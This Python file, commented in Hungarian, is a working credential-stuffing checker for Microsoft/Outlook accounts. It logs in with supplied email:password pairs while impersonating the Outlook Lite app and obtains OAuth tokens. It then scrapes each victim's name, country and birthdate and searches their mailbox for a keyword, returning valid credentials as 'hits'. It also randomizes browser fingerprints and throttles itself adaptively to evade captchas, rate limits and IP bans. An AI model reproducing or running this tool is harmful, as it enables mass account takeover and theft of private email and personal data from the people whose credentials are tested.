import requests
import uuid
import json
import re
import time
import random
import threading
from fake_useragent import UserAgent
from urllib3.util.retry import Retry
from requests.adapters import HTTPAdapter

_ua = UserAgent()

# ═══════════════════════════════════════════════════
# 🔥 ADAPTÍV RATE LIMITER (THREAD-SAFE)
# ═══════════════════════════════════════════════════
class AdaptiveRateLimiter:
    """
    Figyeli a Microsoft válaszait és automatikusan lassít
    ha IP ban közeledik. Proxy nélkül ez a legfontosabb!
    """
    def __init__(self):
        self._lock = threading.Lock()
        # Alap sebesség (másodperc / kérés)
        self.base_delay = 3.0
        # Jelenlegi szorzó (nő ha hibák jönnek)
        self.multiplier = 1.0
        # Max szorzó
        self.max_multiplier = 15.0
        # Egymás utáni hibák száma
        self.consecutive_errors = 0
        # Egymás utáni sikerek száma
        self.consecutive_success = 0
        # Cooldown vége (unix timestamp)
        self.cooldown_until = 0
        # Összes kérés számláló
        self.total_requests = 0
        # Utolsó kérés ideje
        self.last_request_time = 0
        # Kérések az utolsó percben
        self.recent_requests = []
        # Ban detektálva flag
        self.ban_detected = False

    def wait_before_request(self):
        """Minden kérés előtt hívd meg - várakozik ha kell"""
        with self._lock:
            now = time.time()

            # 1) Ha cooldown aktív, várunk
            if now < self.cooldown_until:
                wait = self.cooldown_until - now
                print(f"🧊 COOLDOWN aktív! Várakozás: {wait:.0f}s")
                self._lock.release()
                time.sleep(wait)
                self._lock.acquire()
                now = time.time()

            # 2) Régi kérések törlése (2 perces ablak)
            self.recent_requests = [
                t for t in self.recent_requests
                if now - t < 120
            ]

            # 3) Percenkénti limit (max 8 kérés/perc)
            requests_last_minute = len([
                t for t in self.recent_requests
                if now - t < 60
            ])
            if requests_last_minute >= 8:
                extra_wait = random.uniform(15, 30)
                print(f"⚠️ Percenkénti limit közel ({requests_last_minute}/8)! +{extra_wait:.0f}s")
                self._lock.release()
                time.sleep(extra_wait)
                self._lock.acquire()
                now = time.time()

            # 4) Delay kiszámítása szorzóval + jitter
            delay = self.base_delay * self.multiplier
            jitter = random.uniform(0.5, delay * 0.4)
            total_delay = delay + jitter

            # 5) Minimum idő az utolsó kérés óta
            elapsed = now - self.last_request_time
            if elapsed < total_delay:
                sleep_time = total_delay - elapsed
                self._lock.release()
                time.sleep(sleep_time)
                self._lock.acquire()

            # 6) Kérés rögzítése
            self.last_request_time = time.time()
            self.recent_requests.append(self.last_request_time)
            self.total_requests += 1

    def report_success(self):
        """Sikeres kérés után hívd - csökkenti a szorzót"""
        with self._lock:
            self.consecutive_errors = 0
            self.consecutive_success += 1
            self.ban_detected = False

            # Fokozatosan gyorsítunk vissza (de lassan!)
            if self.consecutive_success >= 5 and self.multiplier > 1.0:
                self.multiplier = max(1.0, self.multiplier * 0.9)
                print(f"✅ Szorzó csökkentve: {self.multiplier:.2f}x")
            if self.consecutive_success >= 15 and self.multiplier > 1.0:
                self.multiplier = max(1.0, self.multiplier * 0.8)

    def report_error(self, error_type: str = "generic"):
        """
        Hiba után hívd meg - növeli a szorzót
        error_type: "rate_limit", "captcha", "block", "generic"
        """
        with self._lock:
            self.consecutive_success = 0
            self.consecutive_errors += 1

            if error_type == "rate_limit":
                # 429-es válasz - komoly lassítás
                self.multiplier = min(
                    self.max_multiplier,
                    self.multiplier * 2.5
                )
                cooldown = random.uniform(60, 120)
                self.cooldown_until = time.time() + cooldown
                print(f"🚨 RATE LIMIT! Szorzó: {self.multiplier:.1f}x | Cooldown: {cooldown:.0f}s")

            elif error_type == "captcha":
                # Captcha megjelent - közepesen lassítunk
                self.multiplier = min(
                    self.max_multiplier,
                    self.multiplier * 2.0
                )
                cooldown = random.uniform(45, 90)
                self.cooldown_until = time.time() + cooldown
                print(f"🤖 CAPTCHA detektálva! Szorzó: {self.multiplier:.1f}x | Cooldown: {cooldown:.0f}s")

            elif error_type == "block":
                # IP block - nagyon komoly
                self.ban_detected = True
                self.multiplier = self.max_multiplier
                cooldown = random.uniform(120, 300)
                self.cooldown_until = time.time() + cooldown
                print(f"🔴 IP BLOCK DETEKTÁLVA! Cooldown: {cooldown:.0f}s")

            else:
                # Általános hiba - kicsit lassítunk
                self.multiplier = min(
                    self.max_multiplier,
                    self.multiplier * 1.3
                )
                if self.consecutive_errors >= 3:
                    cooldown = random.uniform(20, 45)
                    self.cooldown_until = time.time() + cooldown
                    print(f"⚠️ {self.consecutive_errors} egymás utáni hiba! Cooldown: {cooldown:.0f}s")

    def get_status(self) -> dict:
        """Jelenlegi állapot lekérdezése"""
        with self._lock:
            return {
                "multiplier": round(self.multiplier, 2),
                "consecutive_errors": self.consecutive_errors,
                "total_requests": self.total_requests,
                "ban_detected": self.ban_detected,
                "effective_delay": round(self.base_delay * self.multiplier, 1)
            }


# Globális rate limiter példány
_rate_limiter = AdaptiveRateLimiter()


# ═══════════════════════════════════════════════════
# 🔍 VÁLASZ ELEMZŐ - DETEKTÁLJA A BAN JELEKET
# ═══════════════════════════════════════════════════
def detect_block_signals(response) -> str:
    """
    Elemzi a Microsoft válaszát és visszaadja a hiba típusát.
    Returns: "ok", "rate_limit", "captcha", "block", "error"
    """
    status = response.status_code

    # HTTP 429 = Rate Limit
    if status == 429:
        return "rate_limit"

    # HTTP 403 = Tiltás
    if status == 403:
        return "block"

    # HTTP 503 = Szerver túlterhelt (gyakran rate limit miatt)
    if status == 503:
        return "rate_limit"

    text = response.text.lower() if response.text else ""

    # Captcha detektálás
    captcha_signs = [
        "captcha", "recaptcha", "hcaptcha",
        "arkose", "funcaptcha", "enforcementframe",
        "hip_required", "hipchallenge",
        "proofupaliaseserror"
    ]
    for sign in captcha_signs:
        if sign in text:
            return "captcha"

    # Block/ban detektálás
    block_signs = [
        "blocked", "suspicious activity",
        "too many requests", "try again later",
        "temporarily locked", "unusual activity",
        "account has been locked",
        "requestthrottled"
    ]
    for sign in block_signs:
        if sign in text:
            return "block"

    # Rate limit jelek a headers-ben
    retry_after = response.headers.get("Retry-After", "")
    if retry_after:
        return "rate_limit"

    x_ratelimit = response.headers.get("X-RateLimit-Remaining", "")
    if x_ratelimit and x_ratelimit.isdigit() and int(x_ratelimit) <= 1:
        return "rate_limit"

    return "ok"


# ═══════════════════════════════════════════════════
# 🎭 SESSION BUILDER - EGYEDI FINGERPRINT MINDEN KÉRÉSHEZ
# ═══════════════════════════════════════════════════
def create_stealth_session() -> requests.Session:
    """
    Minden ellenőrzéshez teljesen új session,
    egyedi fingerprint-tel.
    """
    session = requests.Session()

    # Retry stratégia: NE retry-oljon automatikusan!
    # (mert az dupla kérést jelent)
    adapter = HTTPAdapter(
        max_retries=Retry(
            total=0,
            backoff_factor=0
        ),
        pool_connections=1,
        pool_maxsize=1
    )
    session.mount("https://", adapter)
    session.mount("http://", adapter)

    # Cookie jar ürítése
    session.cookies.clear()

    return session


def generate_fingerprint() -> dict:
    """
    Egyedi böngésző-fingerprint generálás
    minden kéréshez más-más
    """
    user_agent = generate_user_agent()

    # Különböző Android verziók
    android_versions = ["26", "27", "28", "29", "30", "31", "32", "33"]
    client_versions = [
        "1.1.0+9e54a0d1", "1.2.0+abc12345",
        "1.0.9+ff34ee01", "1.1.1+deadbeef",
        "1.3.0+cafe1234"
    ]

    # Különböző nyelvek (realisztikusabb)
    languages = [
        "en-US,en;q=0.9",
        "en-GB,en;q=0.9",
        "en-US,en;q=0.9,de;q=0.8",
        "en-US,en;q=0.9,fr;q=0.8",
        "en,en-US;q=0.9",
        "en-US,en;q=0.8"
    ]

    return {
        "user_agent": user_agent,
        "client_request_id": str(uuid.uuid4()),
        "correlation_id": str(uuid.uuid4()),
        "client_os": random.choice(android_versions),
        "client_ver": random.choice(client_versions),
        "language": random.choice(languages)
    }


def generate_user_agent():
    try:
        return _ua.random
    except:
        fallbacks = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        ]
        return random.choice(fallbacks)


# ═══════════════════════════════════════════════════
# 🔥 FŐ CHECKER FUNKCIÓ (ADAPTÍV VÉDELEMMEL)
# ═══════════════════════════════════════════════════
def checker_worker_single(email: str, password: str, keyword: str):
    session = create_stealth_session()
    fp = generate_fingerprint()

    try:
        # ═══════════════════════════════════════
        # 1. LÉPÉS: Authorize oldal lekérése
        # ═══════════════════════════════════════
        _rate_limiter.wait_before_request()

        url = (
            "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?"
            f"client_info=1&haschrome=1&login_hint={email}"
            "&mkt=en&response_type=code"
            "&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
            "&scope=profile%20openid%20offline_access"
            "%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
            "&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite"
            "%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
        )

        headers = {
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": fp["user_agent"],
            "Accept": (
                "text/html,application/xhtml+xml,"
                "application/xml;q=0.9,*/*;q=0.8"
            ),
            "return-client-request-id": "false",
            "client-request-id": fp["client_request_id"],
            "x-ms-sso-ignore-sso": "1",
            "correlation-id": fp["correlation_id"],
            "x-client-ver": fp["client_ver"],
            "x-client-os": fp["client_os"],
            "x-client-sku": "MSAL.xplat.android",
            "x-client-src-sku": "MSAL.xplat.android",
            "X-Requested-With": "com.microsoft.outlooklite",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-User": "?1",
            "Sec-Fetch-Dest": "document",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": fp["language"],
        }

        response = session.get(
            url, headers=headers,
            allow_redirects=True, timeout=30
        )

        # 🔍 Válasz ellenőrzése
        signal = detect_block_signals(response)
        if signal != "ok":
            _rate_limiter.report_error(signal)
            return {
                "status": "error",
                "reason": f"Block signal: {signal}"
            }

        response_text = response.text

        # PPFT + urlPost kinyerése
        PPFT = ""
        urlPost = ""

        server_data_pattern = r'var ServerData = ({.*?});'
        server_data_match = re.search(
            server_data_pattern, response_text, re.DOTALL
        )

        if server_data_match:
            try:
                server_data_json = server_data_match.group(1)
                server_data = json.loads(server_data_json)
                sFTTag = server_data.get('sFTTag', '')
                if sFTTag:
                    ppft_pattern = r'value="([^"]+)"'
                    ppft_match = re.search(ppft_pattern, sFTTag)
                    if ppft_match:
                        PPFT = ppft_match.group(1)
                urlPost = server_data.get('urlPost', '')
            except json.JSONDecodeError:
                pass

        if not PPFT:
            start_marker = 'name="PPFT" value="'
            start_index = response_text.find(start_marker)
            if start_index != -1:
                start_index += len(start_marker)
                end_index = response_text.find('"', start_index)
                if end_index != -1:
                    PPFT = response_text[start_index:end_index]

        if not urlPost:
            urlpost_pattern = r'"urlPost":"([^"]+)"'
            urlpost_match = re.search(urlpost_pattern, response_text)
            if urlpost_match:
                urlPost = urlpost_match.group(1)

        if not PPFT or not urlPost:
            _rate_limiter.report_error("generic")
            return {"status": "bad", "reason": "No PPFT/urlPost"}

        _rate_limiter.report_success()

        # Cookie-k mentése
        cookies_dict = session.cookies.get_dict()
        MSPRequ = cookies_dict.get('MSPRequ', '')
        uaid_cookie = cookies_dict.get('uaid', '')
        MSPOK = cookies_dict.get('MSPOK', '')
        OParams = cookies_dict.get('OParams', '')
        referer_url = response.url

        # ═══════════════════════════════════════
        # 2. LÉPÉS: Bejelentkezés POST
        # ═══════════════════════════════════════
        _rate_limiter.wait_before_request()

        data_string = (
            f"i13=1&login={email}&loginfmt={email}"
            f"&type=11&LoginOptions=1&lrt=&lrtPartition="
            f"&hisRegion=&hisScaleUnit=&passwd={password}"
            f"&ps=2&psRNGCDefaultType=&psRNGCEntropy="
            f"&psRNGCSLK=&canary=&ctx=&hpgrequestid="
            f"&PPFT={PPFT}&PPSX=Passport&NewUser=1"
            f"&FoundMSAs=&fspost=0&i21=0"
            f"&CookieDisclosure=0&IsFidoSupported=0"
            f"&isSignupPost=0&isRecoveryAttemptPost=0&i19=3772"
        )

        headers_post = {
            "User-Agent": fp["user_agent"],
            "Pragma": "no-cache",
            "Accept": (
                "text/html,application/xhtml+xml,"
                "application/xml;q=0.9,*/*;q=0.8"
            ),
            "Host": "login.live.com",
            "Connection": "keep-alive",
            "Content-Length": str(len(data_string)),
            "Cache-Control": "max-age=0",
            "Upgrade-Insecure-Requests": "1",
            "Origin": "https://login.live.com",
            "Content-Type": "application/x-www-form-urlencoded",
            "X-Requested-With": "com.microsoft.outlooklite",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-User": "?1",
            "Sec-Fetch-Dest": "document",
            "Referer": referer_url,
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": fp["language"],
            "Cookie": (
                f"MSPRequ={MSPRequ}; uaid={uaid_cookie}; "
                f"MSPOK={MSPOK}; OParams={OParams}"
            )
        }

        post_response = session.post(
            urlPost, data=data_string,
            headers=headers_post,
            allow_redirects=False, timeout=30
        )

        # 🔍 Válasz ellenőrzése
        signal = detect_block_signals(post_response)
        if signal != "ok":
            _rate_limiter.report_error(signal)
            return {
                "status": "error",
                "reason": f"Login block: {signal}"
            }

        cookies_dict = session.cookies.get_dict()
        if "__Host-MSAAUTHP" not in cookies_dict:
            # Ez NEM rate limit hiba, hanem rossz jelszó
            # Tehát NEM büntetjük a rate limitert
            return {"status": "bad", "reason": "Auth failed"}

        _rate_limiter.report_success()

        # Auth code kinyerése
        auth_code = ""
        if post_response.status_code in [301, 302, 303, 307, 308]:
            redirect_url = post_response.headers.get('Location', '')
            if (redirect_url
                    and 'msauth://' in redirect_url
                    and 'code=' in redirect_url):
                auth_code = redirect_url.split('code=')[1].split('&')[0]
        else:
            redirect_pattern = (
                r'window\.location\s*=\s*["\']([^"\']+)["\']'
            )
            redirect_match = re.search(
                redirect_pattern, post_response.text
            )
            if redirect_match:
                redirect_url = redirect_match.group(1)
                if ('msauth://' in redirect_url
                        and 'code=' in redirect_url):
                    auth_code = (
                        redirect_url.split('code=')[1].split('&')[0]
                    )

        CID = cookies_dict.get('MSPCID', '')
        if CID:
            CID = CID.upper()

        # ═══════════════════════════════════════
        # 3. LÉPÉS: Token kérés
        # ═══════════════════════════════════════
        access_token = ""
        if auth_code:
            _rate_limiter.wait_before_request()

            url_token = (
                "https://login.microsoftonline.com/"
                "consumers/oauth2/v2.0/token"
            )
            data_token = {
                "client_info": "1",
                "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
                "redirect_uri": (
                    "msauth://com.microsoft.outlooklite/"
                    "fcg80qvoM1YMKJZibjBwQcDfOno%3D"
                ),
                "grant_type": "authorization_code",
                "code": auth_code,
                "scope": (
                    "profile openid offline_access "
                    "https://outlook.office.com/M365.Access"
                )
            }
            token_response = session.post(
                url_token, data=data_token,
                headers={
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": fp["user_agent"]
                },
                timeout=30
            )

            signal = detect_block_signals(token_response)
            if signal != "ok":
                _rate_limiter.report_error(signal)
                return {
                    "status": "error",
                    "reason": f"Token block: {signal}"
                }

            if token_response.status_code == 200:
                token_data = token_response.json()
                access_token = token_data.get("access_token", "")
                _rate_limiter.report_success()

        if not access_token or not CID:
            return {"status": "bad", "reason": "No token"}

        Name = ""
        Country = ""
        Birthdate = "N/A"
        Total = "NO"
        Date = "N/A"

        # ═══════════════════════════════════════
        # 4. LÉPÉS: Profil lekérése
        # ═══════════════════════════════════════
        _rate_limiter.wait_before_request()

        profile_url = (
            "https://substrate.office.com/"
            "profileb2/v2.0/me/V1Profile"
        )
        profile_headers = {
            "User-Agent": "Outlook-Android/2.0",
            "Pragma": "no-cache",
            "Accept": "application/json",
            "ForceSync": "false",
            "Authorization": f"Bearer {access_token}",
            "X-AnchorMailbox": f"CID:{CID}",
            "Host": "substrate.office.com",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip"
        }

        pRes = session.get(
            profile_url, headers=profile_headers, timeout=30
        )

        signal = detect_block_signals(pRes)
        if signal != "ok":
            _rate_limiter.report_error(signal)
        else:
            _rate_limiter.report_success()

        if pRes.status_code == 200:
            profile_data = pRes.json()
            if ("accounts" in profile_data
                    and profile_data["accounts"]):
                first_account = profile_data["accounts"][0]
                Country = first_account.get("location", "")
                BD = first_account.get("birthDay", "")
                BM = first_account.get("birthMonth", "")
                BY = first_account.get("birthYear", "")
                if BD and BM and BY:
                    Birthdate = (
                        f"{BY}-{str(BM).zfill(2)}-"
                        f"{str(BD).zfill(2)}"
                    )
            if ("names" in profile_data
                    and profile_data["names"]):
                first_name = profile_data["names"][0]
                Name = first_name.get("displayName", "")

        # ═══════════════════════════════════════
        # 5. LÉPÉS: Email keresés
        # ═══════════════════════════════════════
        _rate_limiter.wait_before_request()

        search_url = (
            "https://outlook.live.com/search/api/v2/query"
            "?n=124&cv=tNZ1DVP5NhDwG%2FDUCelaIu.124"
        )
        search_payload = {
            "Cvid": str(uuid.uuid4()),
            "Scenario": {"Name": "owa.react"},
            "TimeZone": "United Kingdom Standard Time",
            "TextDecorations": "Off",
            "EntityRequests": [{
                "EntityType": "Conversation",
                "ContentSources": ["Exchange"],
                "Filter": {
                    "Or": [
                        {"Term": {
                            "DistinguishedFolderName": "msgfolderroot"
                        }},
                        {"Term": {
                            "DistinguishedFolderName": "DeletedItems"
                        }}
                    ]
                },
                "From": 0,
                "Query": {"QueryString": keyword},
                "RefiningQueries": None,
                "Size": 25,
                "Sort": [
                    {
                        "Field": "Score",
                        "SortDirection": "Desc",
                        "Count": 3
                    },
                    {
                        "Field": "Time",
                        "SortDirection": "Desc"
                    }
                ],
                "EnableTopResults": True,
                "TopResultsCount": 3
            }],
            "AnswerEntityRequests": [{
                "Query": {"QueryString": keyword},
                "EntityTypes": ["Event", "File"],
                "From": 0,
                "Size": 100,
                "EnableAsyncResolution": True
            }],
            "QueryAlterationOptions": {
                "EnableSuggestion": True,
                "EnableAlteration": True,
                "SupportedRecourseDisplayTypes": [
                    "Suggestion",
                    "NoResultModification",
                    "NoResultFolderRefinerModification",
                    "NoRequeryModification",
                    "Modification"
                ]
            },
            "LogicalId": str(uuid.uuid4())
        }

        search_headers = {
            "User-Agent": fp["user_agent"],
            "Pragma": "no-cache",
            "Accept": "application/json",
            "ForceSync": "false",
            "Authorization": f"Bearer {access_token}",
            "X-AnchorMailbox": f"CID:{CID}",
            "Host": "outlook.live.com",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip",
            "Content-Type": "application/json"
        }

        search_response = session.post(
            search_url, json=search_payload,
            headers=search_headers, timeout=30
        )

        signal = detect_block_signals(search_response)
        if signal != "ok":
            _rate_limiter.report_error(signal)
        else:
            _rate_limiter.report_success()

        if search_response.status_code == 200:
            search_text = search_response.text

            date_start = search_text.find('"LastModifiedTime":"')
            if date_start != -1:
                date_start += len('"LastModifiedTime":"')
                date_end = search_text.find('"', date_start)
                raw_date = (
                    search_text[date_start:date_end]
                    if date_end != -1 else "N/A"
                )
                if raw_date != "N/A":
                    Date = raw_date.replace("T", " ")[:16]

            total_start = search_text.find('"Total":')
            if total_start != -1:
                total_start += len('"Total":')
                total_end = search_text.find(',', total_start)
                if total_end == -1:
                    total_end = search_text.find('}', total_start)
                Total = (
                    search_text[total_start:total_end].strip()
                    if total_end != -1 else "NO"
                )

        # ═══════════════════════════════════════
        # EREDMÉNY
        # ═══════════════════════════════════════
        if Total != "0" and Total != "NO":
            return {
                "status": "hit",
                "data": {
                    "email": email,
                    "password": password,
                    "country": Country,
                    "name": Name,
                    "birthdate": Birthdate,
                    "date": Date,
                    "mails": Total
                }
            }
        elif Name or Country:
            return {
                "status": "custom",
                "data": {
                    "email": email,
                    "password": password,
                    "country": Country,
                    "name": Name,
                    "birthdate": Birthdate
                }
            }
        else:
            return {"status": "bad", "reason": "No data"}

    except requests.exceptions.Timeout:
        _rate_limiter.report_error("generic")
        return {"status": "error", "reason": "Timeout"}
    except requests.exceptions.ConnectionError:
        _rate_limiter.report_error("rate_limit")
        return {"status": "error", "reason": "Connection refused"}
    except Exception as e:
        _rate_limiter.report_error("generic")
        return {"status": "error", "reason": str(e)}
    finally:
        session.close()


def get_rate_limiter_status() -> dict:
    """Rate limiter állapot lekérése (main.py-ból hívható)"""
    return _rate_limiter.get_status()
